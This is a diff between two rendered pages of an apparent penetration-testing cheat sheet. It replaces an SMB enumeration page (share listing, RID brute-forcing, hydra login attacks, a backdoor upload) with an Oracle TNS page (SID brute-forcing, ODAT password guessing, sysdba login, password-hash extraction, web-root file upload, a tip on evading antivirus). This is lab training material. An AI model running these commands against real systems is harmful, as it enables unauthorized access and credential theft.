@@ -9,10 +9,10 @@
       
       
       
-        <link rel="prev" href="../imap/">
+        <link rel="prev" href="../mssql/">
       
       
-        <link rel="next" href="../snmp/">
+        <link rel="next" href="../nfs/">
       
       
       <link rel="icon" href="../assets/images/favicon.png">
@@ -20,7 +20,7 @@
     
     
       
-        <title>139,445 - SMB - Pentest CS</title>
+        <title>1521 - Oracle TNS - Pentest CS</title>
       
     
     
@@ -106,7 +106,7 @@
         <div class="md-header__topic" data-md-component="header-topic">
           <span class="md-ellipsis">
             
-              139,445 - SMB
+              1521 - Oracle TNS
             
           </span>
         </div>
@@ -336,28 +336,10 @@
       
   
   
-    
   
   
-  
-    <li class="md-nav__item md-nav__item--active">
-      
-      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
-      
-      
-      
-        <label class="md-nav__link md-nav__link--active" for="__toc">
-          
-  
-  <span class="md-ellipsis">
-    139,445 - SMB
-  </span>
-  
-
-          <span class="md-nav__icon md-icon"></span>
-        </label>
-      
-      <a href="./" class="md-nav__link md-nav__link--active">
+    <li class="md-nav__item">
+      <a href="../smb/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -366,60 +348,6 @@
   
 
       </a>
-      
-        
-
-<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
-  
-  
-  
-  
-    <label class="md-nav__title" for="__toc">
-      <span class="md-nav__icon md-icon"></span>
-      Table of contents
-    </label>
-    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
-      
-        <li class="md-nav__item">
-  <a href="#footprinting" class="md-nav__link">
-    <span class="md-ellipsis">
-      🔳 Footprinting
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#list-shares" class="md-nav__link">
-    <span class="md-ellipsis">
-      🔳 List shares
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#enumerate-users" class="md-nav__link">
-    <span class="md-ellipsis">
-      🔳 Enumerate users
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#bruteforce" class="md-nav__link">
-    <span class="md-ellipsis">
-      🔳 Bruteforce
-    </span>
-  </a>
-  
-</li>
-      
-    </ul>
-  
-</nav>
-      
     </li>
   
 
@@ -488,10 +416,28 @@
       
   
   
+    
   
   
-    <li class="md-nav__item">
-      <a href="../oracleTNS/" class="md-nav__link">
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  <span class="md-ellipsis">
+    1521 - Oracle TNS
+  </span>
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
         
   
   <span class="md-ellipsis">
@@ -500,6 +446,42 @@
   
 
       </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#footprinting" class="md-nav__link">
+    <span class="md-ellipsis">
+      🔳 Footprinting
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#interaction" class="md-nav__link">
+    <span class="md-ellipsis">
+      🔳 Interaction
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
     </li>
   
 
@@ -662,27 +644,9 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#list-shares" class="md-nav__link">
+  <a href="#interaction" class="md-nav__link">
     <span class="md-ellipsis">
-      🔳 List shares
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#enumerate-users" class="md-nav__link">
-    <span class="md-ellipsis">
-      🔳 Enumerate users
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#bruteforce" class="md-nav__link">
-    <span class="md-ellipsis">
-      🔳 Bruteforce
+      🔳 Interaction
     </span>
   </a>
   
@@ -703,110 +667,59 @@
                   
 
 
-  <h1>139,445 - SMB</h1>
+  <h1>1521 - Oracle TNS</h1>
 
 <blockquote>
-<p>SMB stands for Server Message Block. It is a network file sharing protocol that allows applications on a computer to read and write to files and to request services from server programs in a computer network.</p>
+<p>The Oracle Transparent Network Substrate (TNS) server is a communication protocol that facilitates communication between Oracle databases and applications over networks.</p>
 </blockquote>
-<p>Source : <a href="https://learn.microsoft.com/en-us/windows-server/storage/file-server/file-server-smb-overview">Microsoft</a></p>
 <h2 id="footprinting">🔳 Footprinting</h2>
 <ul>
 <li>Nmap SE:</li>
 </ul>
-<pre><code class="language-bash">nmap 10.129.14.128 -sV -sC -p139,445
+<pre><code class="language-bash">nmap -p1521 -sV 10.129.204.235
+nmap -p1521 -sV 10.129.204.235 --script oracle-sid-brute
+</code></pre>
+<p>Find SID and valid usernames/passwords with <a href="https://github.com/quentinhardy/odat/releases/">Oracle Database Attacking Tool</a>.</p>
+<ul>
+<li>ODAT:</li>
+</ul>
+<pre><code class="language-bash">./odat.py all -s 10.129.204.235
+./odat.py passwordguesser -s 10.129.204.235 -d $SID
 </code></pre>
 <ul>
-<li>RPCclient:</li>
+<li>Connect to database with SQLplus:</li>
 </ul>
-<pre><code class="language-bash">rpcclient -U &quot;&quot; 10.129.14.128
+<pre><code class="language-bash">sqlplus $USER/$PASS@10.129.204.235/$SID
+</code></pre>
+<h2 id="interaction">🔳 Interaction</h2>
+<p>Check official documentation <a href="https://docs.oracle.com/en/database/oracle/oracle-database/23/sqlqr/SQL-Plus-Commands.html">here</a>.</p>
+<ul>
+<li>List tables:</li>
+</ul>
+<pre><code class="language-bash">select table_name from all_tables;
+</code></pre>
+<ul>
+<li>Connect with high privileges:</li>
+</ul>
+<pre><code class="language-bash">sqlplus $USER/$PASS@10.129.204.235/$SID as sysdba
+</code></pre>
+<ul>
+<li>Extract password Hashes:</li>
+</ul>
+<pre><code class="language-bash">select name, password from sys.user$;
+</code></pre>
+<ul>
+<li>File Upload:</li>
+</ul>
+<pre><code class="language-bash"># Create simple File
+echo &quot;Oracle File Upload Test&quot; &gt; testing.txt
+./odat.py utlfile -s 10.129.204.235 -d XE -U $USER -P $PASS --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt
+./odat.py utlfile -s 10.129.204.235 -d XE -U $USER -P $PASS --sysdba --putFile /var/www/html testing.txt ./testing.txt
 
-rpcclient $&gt; srvinfo
-rpcclient $&gt; enumdomains
-rpcclient $&gt; netshareenumall
-# ... Continue to enumerate with commands (type HELP).
+# Check with cURL:
+curl -X GET http://10.129.204.235/testing.txt
 </code></pre>
-<ul>
-<li><code>srvinfo</code> : Server information.</li>
-<li><code>enumdomains</code> : Enumerate all domains that are deployed in the network.</li>
-<li><code>querydominfo</code> : Provides domain, server, and user information of deployed domains.</li>
-<li><code>netshareenumall</code> : Enumerates all available shares.</li>
-<li><code>netsharegetinfo &lt;share&gt;</code> : Provides information about a specific share.</li>
-<li><code>enumdomusers</code> : Enumerates all domain users.</li>
-<li><code>queryuser &lt;RID&gt;</code> : Query user information by RID.</li>
-</ul>
-<h2 id="list-shares">🔳 List shares</h2>
-<ul>
-<li>With <strong>nxc</strong> tool :</li>
-</ul>
-<pre><code class="language-bash">nxc smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --shares
-</code></pre>
-<ul>
-<li>CrackMapExec:</li>
-</ul>
-<pre><code class="language-bash">crackmapexec smb 10.129.14.128 --shares -u '' -p ''
-</code></pre>
-<ul>
-<li>With <strong>smbMap</strong>, you can list shares and its content : </li>
-</ul>
-<pre><code class="language-bash">smbmap -H 10.2.16.224 -u &quot;administrator&quot; -p &quot;smbserver_771&quot;
-smbmap -H 10.2.16.224 -u &quot;administrator&quot; -p &quot;smbserver_771&quot; -r $SHARE
-</code></pre>
-<ul>
-<li>Download or Upload file : </li>
-</ul>
-<pre><code class="language-bash">smbmap -H 10.2.16.224 -u &quot;administrator&quot; -p &quot;password&quot; --download &quot;C/flag.txt&quot;
-
-smbmap -H 10.0.28.123 -u &quot;administrator&quot; -p 'password' --upload '/root/backdoor' 'C$\backdoor
-</code></pre>
-<ul>
-<li>With <strong>smbclient</strong> : </li>
-</ul>
-<pre><code class="language-bash">smbclient -L //192.42.109.3/ -U &quot;&quot;
-smbclient -N -L //192.42.109.3/ # Anonymous session
-
-smbclient //192.42.109.3/public -U &quot;&quot;
-</code></pre>
-<h2 id="enumerate-users">🔳 Enumerate users</h2>
-<p>You can enumerate active users on the targets :</p>
-<ul>
-<li>Samrdump (Impacket):</li>
-</ul>
-<pre><code class="language-bash">samrdump 10.10.10.10
-</code></pre>
-<ul>
-<li>enum4linux-ng:</li>
-</ul>
-<pre><code class="language-bash"># -a to enum all options
-enum4linux-ng -A &lt;IP&gt;
-</code></pre>
-<ul>
-<li>With rpcclient:</li>
-</ul>
-<pre><code class="language-bash">rpcclient -U &quot;&quot; -N &lt;IP&gt; 
-
-rpcclient $&gt; enumdomusers
-rpcclient $&gt; queryuser 0x$$$
-
-rpcclient $&gt; querygroup 0x$$$
-</code></pre>
-<ul>
-<li>Bruteforce User RIDs:</li>
-</ul>
-<pre><code class="language-bash">for i in $(seq 500 1100);do rpcclient -N -U &quot;&quot; 10.129.14.128 -c &quot;queryuser 0x$(printf '%x\n' $i)&quot; | grep &quot;User Name\|user_rid\|group_rid&quot; &amp;&amp; echo &quot;&quot;;done
-
-# NetExec:
-nxc smb &quot;10.129.146.37&quot; -u '' -p '' --rid-brute
-</code></pre>
-<ul>
-<li>Metasploit:</li>
-</ul>
-<pre><code class="language-bash"># Metasploit Module :
-use auxiliary/scanner/smb/smb_enumusers
-</code></pre>
-<h2 id="bruteforce">🔳 Bruteforce</h2>
-<p>This can be done with <strong>hydra</strong> : </p>
-<pre><code class="language-bash">hydra -l Administrator -P /opt/rockyou.txt smb://&lt;IP&gt; -v -V
-</code></pre>
+<p>First, trying our exploitation approach with files that do not look dangerous for Antivirus or Intrusion detection/prevention systems is always important !</p>
 
 
 
